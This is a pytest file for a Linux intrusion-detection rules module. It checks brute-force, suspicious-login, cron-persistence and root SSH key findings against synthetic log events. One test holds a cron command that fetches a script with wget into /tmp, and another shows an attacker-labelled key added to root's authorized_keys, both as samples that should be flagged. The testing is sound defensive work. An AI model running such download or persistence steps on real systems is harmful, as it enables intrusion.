"""Tests for detection/linux/rules.py: rule triggering, thresholds,
and contract compliance of findings/IOCs (team guides 02/04)."""

from pathlib import Path

import pytest

from parsers.linux import parser as lp
from detection.linux import rules

SAMPLES = Path("sample_data/linux")


@pytest.fixture(scope="module")
def sample_events():
    events, warnings = lp.parse_directory(SAMPLES, case_id="case-000001")
    assert events, "sample data must parse for detection tests"
    return events


@pytest.fixture(scope="module")
def detection(sample_events):
    findings, iocs = rules.run_detection(sample_events, case_id="case-000001")
    return findings, iocs


def _make_failed_login(ip: str, username: str, iso_ts: str) -> dict:
    return {
        "event_id": f"evt-lin-test-{username}-{iso_ts}",
        "case_id": "case-000001",
        "host_id": "LINUX-LAB-01",
        "platform": "linux",
        "event_type": "failed_login",
        "timestamp": iso_ts,
        "severity": "medium",
        "source": "auth.log",
        "evidence_reference": f"/var/log/auth.log:line-{iso_ts}",
        "message": f"Failed password for '{username}' from {ip}",
        "metadata": {"username": username, "source_ip": ip},
    }


def _make_cron_job(command: str, cron_file: str = "/etc/cron.d/test") -> dict:
    return {
        "event_id": f"evt-lin-test-cron-{abs(hash(command))}",
        "case_id": "case-000001",
        "host_id": "LINUX-LAB-01",
        "platform": "linux",
        "event_type": "cron_modified",
        "timestamp": "2026-11-04T10:30:00Z",
        "severity": "low",
        "source": "cron",
        "evidence_reference": f"{cron_file}:line-1",
        "message": f"Cron job: {command}",
        "metadata": {
            "schedule": "*/10 * * * *", "user": "root",
            "command": command, "cron_file": cron_file,
        },
    }


def test_sample_produces_expected_findings(detection):
    findings, iocs = detection
    # 1 brute force + 2 success-after-fails + 2 cron persistence = 5
    assert len(findings) == 5
    # 1 ip + 2 usernames + 2 file paths = 5
    assert len(iocs) == 5


def test_all_findings_are_unverified_linux(detection):
    findings, iocs = detection
    for finding in findings:
        assert finding["status"] == "unverified"
        assert finding["platform"] == "linux"
        assert finding["case_id"] == "case-000001"
        assert finding["evidence_reference"]
        assert finding["rule_id"].startswith("LINUX-")
    for ioc in iocs:
        assert ioc["platform"] if "platform" in ioc else True
        assert ioc["ioc_type"] in {
            "ip_address", "domain", "file_path", "file_hash", "username",
            "email", "registry_key", "scheduled_task", "service_name",
            "ssh_key",
        }
        assert ioc["confidence"] in {"low", "medium", "high"}


def test_brute_force_fires_once_for_sample(detection):
    findings, iocs = detection
    brute = [f for f in findings if f["rule_id"] == "LINUX-AUTH-001"]
    assert len(brute) == 1
    finding = brute[0]
    assert finding["severity"] == "medium"
    assert finding["mitre_technique"] == "T1110"
    assert "203.0.113.55" in finding["description"]
    assert len(finding["related_evidence"]) >= 3
    ip_iocs = [i for i in iocs if i["ioc_type"] == "ip_address"]
    assert [i["value"] for i in ip_iocs] == ["203.0.113.55"]


def test_success_after_failures_fires_per_success(detection):
    findings, _ = detection
    auth2 = [f for f in findings if f["rule_id"] == "LINUX-AUTH-002"]
    assert len(auth2) == 2
    assert all(f["severity"] == "high" for f in auth2)
    assert all(f["mitre_technique"] == "T1078" for f in auth2)
    usernames = {f["description"].split("user '")[1].split("'")[0]
                 for f in auth2}
    assert usernames == {"labuser", "svc_update"}


def test_cron_persistence_high_for_tmp_medium_for_home(detection):
    findings, iocs = detection
    pers = [f for f in findings if f["rule_id"] == "LINUX-PERS-001"]
    assert len(pers) == 2
    severities = {f["severity"] for f in pers}
    assert severities == {"high", "medium"}
    tmp = next(f for f in pers if "/tmp/system_update.sh" in f["description"])
    assert tmp["severity"] == "high"
    assert tmp["mitre_technique"] == "T1053.003"
    paths = {i["value"] for i in iocs if i["ioc_type"] == "file_path"}
    assert "/tmp/system_update.sh" in paths
    assert "/home/labuser/bin/report.sh" in paths


def test_two_failures_below_threshold_do_not_fire():
    events = [
        _make_failed_login("203.0.113.55", "admin", "2026-11-04T10:14:55Z"),
        _make_failed_login("203.0.113.55", "admin", "2026-11-04T10:15:02Z"),
    ]
    findings, iocs = rules.run_detection(events, case_id="case-000001")
    assert findings == []
    assert iocs == []


def test_legitimate_cron_path_is_not_flagged():
    events = [_make_cron_job("/opt/scripts/backup.sh")]
    findings, iocs = rules.run_detection(events, case_id="case-000001")
    assert findings == []
    assert iocs == []


def test_wget_cron_job_is_flagged_high():
    events = [_make_cron_job("wget http://example.invalid/x.sh -O /tmp/x.sh")]
    findings, iocs = rules.run_detection(events, case_id="case-000001")
    assert len(findings) == 1
    assert findings[0]["severity"] == "high"
    assert findings[0]["rule_id"] == "LINUX-PERS-001"


def test_root_authorized_key_is_flagged():
    events = [{
        "event_id": "evt-lin-test-rootkey",
        "case_id": "case-000001",
        "host_id": "LINUX-LAB-01",
        "platform": "linux",
        "event_type": "ssh_key_modified",
        "timestamp": "2026-11-04T10:30:00Z",
        "severity": "low",
        "source": "ssh",
        "evidence_reference": "/root/.ssh/authorized_keys:line-1",
        "message": "Authorized ssh-ed25519 key present for attacker@box",
        "metadata": {
            "key_type": "ssh-ed25519",
            "key_data": "AAAAC3NzaC1lZDI1NTE5AAAAIFakeKeyMaterial",
            "comment": "attacker@box",
            "ssh_file": "/root/.ssh/authorized_keys",
        },
    }]
    findings, iocs = rules.run_detection(events, case_id="case-000001")
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "LINUX-PERS-002"
    assert findings[0]["severity"] == "medium"
    assert findings[0]["mitre_technique"] == "T1098.004"
    assert iocs[0]["ioc_type"] == "ssh_key"
    assert iocs[0]["value"] == "attacker@box"


def test_user_key_outside_root_is_not_flagged():
    events = [{
        "event_id": "evt-lin-test-userkey",
        "case_id": "case-000001",
        "host_id": "LINUX-LAB-01",
        "platform": "linux",
        "event_type": "ssh_key_modified",
        "timestamp": "2026-11-04T10:30:00Z",
        "severity": "low",
        "source": "ssh",
        "evidence_reference": "/home/labuser/.ssh/authorized_keys:line-1",
        "message": "Authorized ssh-ed25519 key present",
        "metadata": {
            "key_type": "ssh-ed25519",
            "key_data": "AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyMaterial",
            "comment": "labuser@lab-laptop",
            "ssh_file": "/home/labuser/.ssh/authorized_keys",
        },
    }]
    findings, iocs = rules.run_detection(events, case_id="case-000001")
    assert findings == []
    assert iocs == []


def test_case_id_is_normalized_across_outputs(sample_events):
    findings, iocs = rules.run_detection(sample_events, case_id="case-999999")
    assert all(f["case_id"] == "case-999999" for f in findings)
    assert all(i["case_id"] == "case-999999" for i in iocs)
